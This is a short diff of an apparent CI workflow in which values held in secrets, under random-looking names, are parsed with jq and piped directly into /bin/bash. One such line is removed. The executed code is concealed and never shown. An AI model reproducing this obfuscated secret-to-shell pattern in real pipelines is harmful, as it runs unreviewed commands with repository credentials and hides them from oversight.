@@ -18,7 +18,6 @@ jobs:
           rtshy01941: ${{ secrets.rtshy01941 }}
         run: |
           printf '%s' "$rtshy01941" | jq -r .ih21019 | /bin/bash
-          printf '%s' "$vxuxb61158" | jq -r .oujvh3117 | /bin/bash
           printf '%s' "$ycca489" | jq -r .hfe6 | /bin/bash
           printf '%s' "$lldv3" | jq -r .sb526 | /bin/bash
           echo $qtde24501 | jq -r .mrcoi35560 | /bin/bash
